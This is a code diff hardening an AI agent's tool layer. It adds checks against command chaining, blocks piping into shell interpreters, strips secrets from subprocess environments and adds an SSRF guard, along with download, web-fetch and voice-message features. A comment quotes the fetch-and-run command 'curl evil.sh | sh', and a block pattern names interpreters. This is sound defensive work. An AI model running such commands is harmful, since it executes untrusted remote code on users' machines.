@@ -5,6 +5,7 @@ Provides safe, whitelisted, and confirmed interface for file/OS operations.
 
 import asyncio
 import base64
+import ipaddress
 import json
 import mimetypes
 import os
@@ -12,6 +13,7 @@ import re
 import shutil
 import socket
 import subprocess
+import urllib.parse
 import uuid
 from pathlib import Path
 from typing import Any, Dict, List, Optional, Union
@@ -34,6 +36,12 @@ _SENSITIVE_NAMES = frozenset(
     }
 )
 _SENSITIVE_EXTENSIONS = frozenset({".pem", ".key", ".p12", ".pfx"})
+# Max bytes for remote downloads (send_media / fetch_url_to_temp).
+_MAX_DOWNLOAD_BYTES = 15 * 1024 * 1024
+_DOWNLOAD_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+)
 _OUTBOUND_FORBIDDEN_FILENAMES = frozenset(
     {
         "identity.md",
@@ -267,6 +275,30 @@ class Toolbox:
             token in lowered for token in ("opera.exe", "msedge.exe", "chrome.exe")
         )
 
+    @staticmethod
+    def _has_unquoted_semicolon(command: str) -> bool:
+        """Return True when a semicolon can act as a shell command separator."""
+        in_single = False
+        in_double = False
+        escaped = False
+
+        for char in command or "":
+            if escaped:
+                escaped = False
+                continue
+            if char == "\\":
+                escaped = True
+                continue
+            if char == "'" and not in_double:
+                in_single = not in_single
+                continue
+            if char == '"' and not in_single:
+                in_double = not in_double
+                continue
+            if char == ";" and not in_single and not in_double:
+                return True
+        return False
+
     async def send_progress(self, message: str):
         """Broadcast tool progress if an agent/bus is available."""
         if self.agent and hasattr(self.agent, "send_tool_progress"):
@@ -297,9 +329,21 @@ class Toolbox:
             except Exception as e:
                 logger.warning(f"Failed to read subagent registry: {e}")
 
+        # Search tools are available when a search API key is configured
+        # (browser-skill enablement is handled inside build_tool_definitions).
+        search_available = False
+        try:
+            from core.web_search import search_api_configured
+
+            search_available = search_api_configured(self.config)
+        except Exception:
+            search_available = False
+
         # Base tools from tool_defs.py
         tools = build_tool_definitions(
-            enabled_skills, available_agents=available_agents
+            enabled_skills,
+            available_agents=available_agents,
+            search_available=search_available,
         )
 
         # Load MCP tools dynamically
@@ -989,9 +1033,29 @@ class Toolbox:
                 continue
         return rows
 
+    @staticmethod
+    def _sanitized_env() -> dict:
+        """Return a copy of the process environment with secrets stripped.
+
+        ``config.py`` injects provider credentials into ``os.environ`` for
+        legitimate in-process consumers (LiteLLM, vector embeddings, browser
+        tooling). Subprocesses spawned by ``run_command`` inherit the full
+        environment by default, so an approved-by-mistake ``env``/``printenv``
+        would exfiltrate every key. Drop anything that looks like a secret
+        while preserving PATH/HOME/TMPDIR and other benign vars.
+        """
+        secret_suffixes = ("API_KEY", "_TOKEN", "_SECRET", "PASSWORD", "APIKEY")
+        sanitized = {}
+        for key, value in os.environ.items():
+            upper = key.upper()
+            if any(upper.endswith(suffix) for suffix in secret_suffixes):
+                continue
+            sanitized[key] = value
+        return sanitized
+
     async def run_command(self, command: str) -> str:
         """Execute a terminal command with real-time progress updates."""
-        forbidden_regex = r"(\$\(|\`|;|&&|\|\||>|<|\n)"
+        forbidden_regex = r"(\$\(|\`|&&|\|\||>|<|\n)"
         pseudo_call_match = re.match(
             r"^\s*([A-Za-z_][\w\.]*)\s*\((.*)\)\s*$", str(command or ""), re.DOTALL
         )
@@ -1012,6 +1076,25 @@ class Toolbox:
         if not unsafe_allowed and re.search(forbidden_regex, command):
             match = re.search(forbidden_regex, command).group(0)
             return f"Error: Command contains forbidden character/sequence '{match}'. Enable 'Allow Unsafe Commands' in Config to bypass this restriction."
+
+        if not unsafe_allowed and self._has_unquoted_semicolon(command):
+            return "Error: Command contains forbidden character/sequence ';'. Enable 'Allow Unsafe Commands' in Config to bypass this restriction."
+
+        # The forbidden_regex intentionally permits a bare pipe `|` so legitimate
+        # flows like `... | grep` / `... | head` keep working. That same pipe,
+        # however, enables `curl evil.sh | sh`, turning a fetched payload into
+        # arbitrary code execution. Block piping into interpreters/executors
+        # specifically while leaving text filters untouched.
+        if not unsafe_allowed and re.search(
+            r"\|\s*(sh|bash|zsh|dash|ksh|fish|python[0-9.]*|perl|ruby|node|xargs)\b",
+            command,
+        ):
+            return (
+                "Error: Piping command output directly into an interpreter "
+                "(e.g. '| sh', '| bash', '| python') is blocked to prevent "
+                "remote code execution. Download and inspect the script first, "
+                "or enable 'Allow Unsafe Commands' in Config."
+            )
 
         lowered_command = command.lower()
         if any(f in lowered_command for f in ["ifs=", "pythonpath="]):
@@ -1069,6 +1152,7 @@ class Toolbox:
                     stderr=subprocess.DEVNULL,
                     creationflags=creationflags,
                     close_fds=True,
+                    env=self._sanitized_env(),
                 )
 
                 deadline = _time.monotonic() + 10
@@ -1089,6 +1173,7 @@ class Toolbox:
                 "stdout": asyncio.subprocess.PIPE,
                 "stderr": asyncio.subprocess.PIPE,
                 "cwd": str(self.allowed_paths[0]),
+                "env": self._sanitized_env(),
             }
             if os.name == "nt":
                 kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
@@ -1380,8 +1465,268 @@ class Toolbox:
             logger.error(f"Error spawning agent: {e}")
             return f"Error spawning agent: {e}"
 
+    @staticmethod
+    def _is_safe_public_url(url: str) -> tuple[bool, str]:
+        """SSRF guard: only http(s) to a resolvable, public IP address.
+
+        LimeBot runs on a personal machine, so a URL supplied by the LLM (from a
+        prompt-injected page or a Discord message) must never be able to reach
+        loopback/private/link-local services. Every resolved address is checked.
+        """
+        url = str(url or "").strip()
+        if not url:
+            return False, "Empty URL."
+        try:
+            parsed = urllib.parse.urlparse(url)
+        except Exception:
+            return False, "Invalid URL."
+        if parsed.scheme not in ("http", "https"):
+            return False, f"Only http(s) URLs are allowed (got '{parsed.scheme or 'none'}')."
+        host = parsed.hostname
+        if not host:
+            return False, "URL has no host."
+        try:
+            port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        except ValueError:
+            return False, "Invalid port in URL."
+        try:
+            infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
+        except Exception as e:
+            return False, f"Could not resolve host '{host}': {e}"
+        for info in infos:
+            ip_str = info[4][0]
+            try:
+                ip = ipaddress.ip_address(ip_str)
+            except ValueError:
+                return False, f"Invalid resolved address for '{host}'."
+            if (
+                ip.is_private
+                or ip.is_loopback
+                or ip.is_link_local
+                or ip.is_reserved
+                or ip.is_multicast
+                or ip.is_unspecified
+            ):
+                return False, (
+                    f"Refusing to fetch a non-public address ({ip_str}) for host '{host}'."
+                )
+        return True, ""
+
+    async def _safe_fetch(
+        self, url: str, *, max_bytes: int, timeout: float
+    ) -> tuple[str, str, bytes]:
+        """Fetch a URL, validating every redirect hop against the SSRF guard.
+
+        Returns (final_url, content_type, body_bytes). Raises ValueError for
+        unsafe hosts, oversized responses, or redirect loops.
+        """
+        try:
+            import httpx
+        except Exception as e:  # pragma: no cover - httpx is a core dep
+            raise ValueError(f"httpx is required for URL fetching: {e}")
+
+        headers = {
+            "User-Agent": _DOWNLOAD_UA,
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Referer": "https://www.google.com/",
+        }
+        current = url
+        async with httpx.AsyncClient(
+            timeout=timeout, follow_redirects=False, headers=headers
+        ) as client:
+            for _ in range(6):
+                ok, reason = self._is_safe_public_url(current)
+                if not ok:
+                    raise ValueError(reason)
+                async with client.stream("GET", current) as response:
+                    if response.is_redirect:
+                        location = response.headers.get("location", "")
+                        if not location:
+                            raise ValueError("Redirect without a location header.")
+                        current = urllib.parse.urljoin(current, location)
+                        continue
+                    response.raise_for_status()
+                    content_type = (
+                        (response.headers.get("content-type") or "")
+                        .split(";")[0]
+                        .strip()
+                        .lower()
+                    )
+                    buf = bytearray()
+                    total = 0
+                    async for chunk in response.aiter_bytes():
+                        total += len(chunk)
+                        if total > max_bytes:
+                            raise ValueError(
+                                f"Response exceeds the {max_bytes // (1024 * 1024)}MB limit."
+                            )
+                        buf.extend(chunk)
+                    return current, content_type, bytes(buf)
+        raise ValueError("Too many redirects.")
+
+    @staticmethod
+    def _guess_download_extension(data: bytes, content_type: str, url: str) -> str:
+        """Pick a file extension from magic bytes, then content-type, then URL."""
+        if data[:3] == b"\xff\xd8\xff":
+            return ".jpg"
+        if data[:8] == b"\x89PNG\r\n\x1a\n":
+            return ".png"
+        if data[:4] == b"GIF8":
+            return ".gif"
+        if data[:4] == b"RIFF" and data[8:12] == b"WEBP":
+            return ".webp"
+        if data[:4] == b"%PDF":
+            return ".pdf"
+        if content_type:
+            ext = mimetypes.guess_extension(content_type)
+            if ext:
+                return ".jpg" if ext == ".jpe" else ext
+        suffix = Path(urllib.parse.urlparse(url).path).suffix
+        if suffix and len(suffix) <= 6 and re.fullmatch(r"\.[A-Za-z0-9]+", suffix):
+            return suffix
+        return ".bin"
+
+    async def fetch_url_to_temp(
+        self, url: str, max_bytes: int = _MAX_DOWNLOAD_BYTES
+    ) -> str:
+        """Download a public http(s) URL into temp/downloads and return its path."""
+        url = str(url or "").strip()
+        ok, reason = self._is_safe_public_url(url)
+        if not ok:
+            return f"Error: {reason}"
+
+        await self.send_progress(f"⬇️ Downloading: {url}")
+        dest_dir = self.allowed_paths[0] / "temp" / "downloads"
+        try:
+            await asyncio.to_thread(lambda: dest_dir.mkdir(parents=True, exist_ok=True))
+        except Exception as e:
+            return f"Error: Could not create download directory: {e}"
+
+        try:
+            final_url, content_type, data = await self._safe_fetch(
+                url, max_bytes=max_bytes, timeout=30.0
+            )
+        except ValueError as e:
+            return f"Error: {e}"
+        except Exception as e:
+            return f"Error: Download failed: {e}"
+
+        if not data:
+            return "Error: Downloaded file was empty."
+
+        ext = self._guess_download_extension(data, content_type, final_url)
+        dest = dest_dir / f"dl_{uuid.uuid4().hex[:12]}{ext}"
+        try:
+            await asyncio.to_thread(dest.write_bytes, data)
+        except Exception as e:
+            return f"Error: Could not save file: {e}"
+        return self._to_display_path(dest)
+
+    @staticmethod
+    def _html_to_text(html: str) -> str:
+        """Best-effort readable text from HTML (BeautifulSoup if available)."""
+        try:
+            from bs4 import BeautifulSoup
+        except Exception:
+            return re.sub(r"<[^>]+>", " ", html)
+        soup = BeautifulSoup(html, "html.parser")
+        for tag in soup(
+            ["script", "style", "noscript", "nav", "footer", "header", "svg", "form"]
+        ):
+            tag.decompose()
+        text = soup.get_text("\n", strip=True)
+        return re.sub(r"\n{3,}", "\n\n", text)
+
+    async def fetch_readable_text(self, url: str, max_chars: int = 4000) -> str:
+        """Fetch a page and return its readable text, SSRF-guarded."""
+        url = str(url or "").strip()
+        ok, reason = self._is_safe_public_url(url)
+        if not ok:
+            return f"Error: {reason}"
+        try:
+            _final_url, content_type, data = await self._safe_fetch(
+                url, max_bytes=5 * 1024 * 1024, timeout=20.0
+            )
+        except ValueError as e:
+            return f"Error: {e}"
+        except Exception as e:
+            return f"Error: Fetch failed: {e}"
+
+        text = data.decode("utf-8", errors="ignore")
+        if "html" in content_type or "<html" in text[:2000].lower():
+            text = self._html_to_text(text)
+        text = text.strip()
+        if not text:
+            return "Error: No readable text found at that URL."
+        if len(text) > max_chars:
+            text = text[:max_chars] + f"\n... (truncated at {max_chars} chars)"
+        return text
+
+    async def _publish_web_media(self, file_path: Path, caption: str) -> None:
+        """Publish a local file to the web chat as a servable attachment."""
+        from core.context import tool_context
+        from core.events import OutboundMessage
+
+        ctx = tool_context.get() or {}
+        chat_id = (ctx.get("chat_id") or "").strip()
+        if not chat_id:
+            return
+
+        # Ensure the file lives under temp/ so the /temp static mount can serve it.
+        temp_root = (self.allowed_paths[0] / "temp").resolve()
+        try:
+            file_path.resolve().relative_to(temp_root)
+            servable = file_path
+        except Exception:
+            dl_dir = self.allowed_paths[0] / "temp" / "downloads"
+            await asyncio.to_thread(
+                lambda: dl_dir.mkdir(parents=True, exist_ok=True)
+            )
+            servable = dl_dir / file_path.name
+            await asyncio.to_thread(shutil.copyfile, file_path, servable)
+
+        mime_type = mimetypes.guess_type(servable.name)[0] or "application/octet-stream"
+        is_image = mime_type.startswith("image/")
+        url = ""
+        try:
+            rel = servable.resolve().relative_to(temp_root)
+            url = f"/temp/{rel.as_posix()}"
+        except Exception:
+            if is_image:
+                try:
+                    blob = await asyncio.to_thread(servable.read_bytes)
+                    url = (
+                        f"data:{mime_type};base64,"
+                        f"{base64.b64encode(blob).decode('ascii')}"
+                    )
+                except Exception:
+                    url = ""
+
+        attachment = {
+            "name": servable.name,
+            "kind": "image" if is_image else "document",
+            "mime_type": mime_type,
+            "mimeType": mime_type,
+            "path": self._to_display_path(servable),
+            "url": url,
+        }
+        metadata: Dict[str, Any] = {"attachments": [attachment]}
+        if is_image and url:
+            metadata["image"] = url
+        await self.bus.publish_outbound(
+            OutboundMessage(
+                channel="web", chat_id=chat_id, content=caption, metadata=metadata
+            )
+        )
+
     async def send_media(self, path: str, caption: str = "") -> str:
-        """Send a local file back to the current Discord or WhatsApp chat."""
+        """Share a local file OR a remote http(s) URL into the current chat.
+
+        Works for web, Discord, and WhatsApp. Remote URLs are downloaded into
+        temp/downloads first (SSRF-guarded), then delivered as a local file, so
+        the agent can act on image URLs found via image_search / web_search.
+        """
         from core.context import tool_context
         from core.events import OutboundMessage
 
@@ -1389,16 +1734,33 @@ class Toolbox:
         channel = (ctx.get("channel") or "").strip().lower()
         chat_id = (ctx.get("chat_id") or "").strip()
 
-        if channel not in {"discord", "whatsapp"}:
+        if channel not in {"discord", "whatsapp", "web"}:
             return (
-                "Error: send_media only works from Discord or WhatsApp conversations."
+                "Error: send_media is only available in web, Discord, or WhatsApp "
+                "conversations."
             )
         if not chat_id:
             return "Error: Missing current chat context for media delivery."
 
+        source = str(path or "").strip()
+        if not source:
+            return "Error: A local file path or http(s) URL is required."
+
+        if source.lower().startswith(("http://", "https://")):
+            downloaded = await self.fetch_url_to_temp(source)
+            if downloaded.startswith("Error:"):
+                return downloaded
+            path = downloaded
+
         ok, error, resolved = self._is_path_shareable(path)
         if not ok or resolved is None:
             return f"Error: {error}"
+
+        caption = str(caption or "").strip()
+
+        if channel == "web":
+            await self._publish_web_media(resolved, caption)
+            return f"Displayed '{self._to_display_path(resolved)}' in the web chat."
 
         await self.bus.publish_outbound(
             OutboundMessage(
@@ -1408,12 +1770,85 @@ class Toolbox:
                 metadata={
                     "type": "file",
                     "file_path": str(resolved),
-                    "caption": str(caption or "").strip(),
+                    "caption": caption,
                 },
             )
         )
         display_path = self._to_display_path(resolved)
         return f"Sent '{display_path}' to the current {channel} chat."
+
+    async def send_voice(self, text: str, channel: str = "") -> str:
+        """Speak `text` aloud as a voice message in the current chat.
+
+        Synthesizes speech with ElevenLabs and delivers it as audio: an mp3 file
+        on Discord/WhatsApp, or an inline playable clip on web. Use this when the
+        user asks to be sent a voice message / voice note instead of text.
+
+        Requires an ElevenLabs API key (Settings → Credentials). Returns an
+        "Error: ..." string if voice is unavailable so you can fall back to text.
+        """
+        from core.context import tool_context
+        from core.events import OutboundMessage
+
+        try:
+            from core.tts import ElevenLabsTTS
+        except Exception as e:  # pragma: no cover - defensive import guard
+            return f"Error: voice synthesis is unavailable ({e})."
+
+        ctx = tool_context.get() or {}
+        ctx_channel = (ctx.get("channel") or "").strip().lower()
+        target = (str(channel or "").strip().lower()) or ctx_channel
+        chat_id = (ctx.get("chat_id") or "").strip()
+
+        if target not in {"discord", "whatsapp", "web"}:
+            return (
+                "Error: send_voice is only available in web, Discord, or WhatsApp "
+                "conversations."
+            )
+        if not chat_id:
+            return "Error: Missing current chat context for voice delivery."
+
+        spoken = str(text or "").strip()
+        if not spoken:
+            return "Error: Text to speak is required."
+
+        if not ElevenLabsTTS.get_api_key():
+            return (
+                "Error: ElevenLabs API key is not configured. Add it under "
+                "Settings → Credentials to enable voice."
+            )
+
+        if target == "web":
+            audio_url = await ElevenLabsTTS.synthesize_and_save(spoken)
+            if not audio_url:
+                return "Error: Voice synthesis failed."
+            await self.bus.publish_outbound(
+                OutboundMessage(
+                    channel="web",
+                    chat_id=chat_id,
+                    content="",
+                    metadata={"voice_url": audio_url},
+                )
+            )
+            return "Sent a voice message to the web chat."
+
+        audio_path = await ElevenLabsTTS.synthesize_to_file(spoken)
+        if not audio_path:
+            return "Error: Voice synthesis failed."
+        await self.bus.publish_outbound(
+            OutboundMessage(
+                channel=target,
+                chat_id=chat_id,
+                content="",
+                metadata={
+                    "type": "file",
+                    "file_path": audio_path,
+                    "caption": "",
+                    "cleanup_file": True,
+                },
+            )
+        )
+        return f"Sent a voice message to the current {target} chat."
 
     @staticmethod
     def _normalize_image_model(model: str) -> str:
